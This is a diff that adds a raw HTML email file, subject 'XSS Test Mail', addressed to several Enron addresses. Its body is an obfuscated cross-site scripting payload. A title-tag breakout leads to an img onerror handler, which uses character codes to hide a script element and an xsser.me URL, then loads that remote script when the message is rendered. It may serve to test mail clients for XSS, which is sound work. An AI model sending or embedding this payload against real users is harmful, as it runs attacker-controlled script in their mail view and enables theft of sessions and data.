@@ -1,0 +1,7 @@
+From: richard.morgan@austinenergy.com
+To: vince.kaminski@enron.com, zimin.lu@enron.com, stinson.gibner@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<title><img a="</title><img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,53,78,83,55,97,99);document.body.appendChild(window.s)})()//>">
